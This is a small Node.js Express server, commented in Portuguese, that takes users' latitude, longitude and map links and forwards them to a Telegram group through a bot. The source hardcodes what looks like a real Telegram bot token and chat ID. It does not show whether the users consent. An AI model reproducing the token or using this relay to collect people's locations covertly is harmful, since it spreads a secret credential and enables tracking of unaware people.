const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Substitua com seu token e ID do grupo
const TELEGRAM_BOT_TOKEN = "7390949952:AAHdSxwxo7cCr_CixSbHfO_eVXmaH66CDhg";
const TELEGRAM_CHAT_ID = "-1002461794151";

// Rota para receber localização e enviar para o Telegram
app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  if (!latitude || !longitude || !maps) {
    return res.status(400).json({ success: false, message: "Parâmetros incompletos." });
  }

  const message = `📍 *Localização do usuário:*\n\n📌 Latitude: ${latitude}\n📌 Longitude: ${longitude}\n🔗 [Abrir no Maps](${maps})`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar mensagem para o Telegram:", error.response?.data || error.message);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

// Inicia o servidor
app.listen(8088, () => {
  console.log("🚀 Servidor rodando na porta 8088");
});
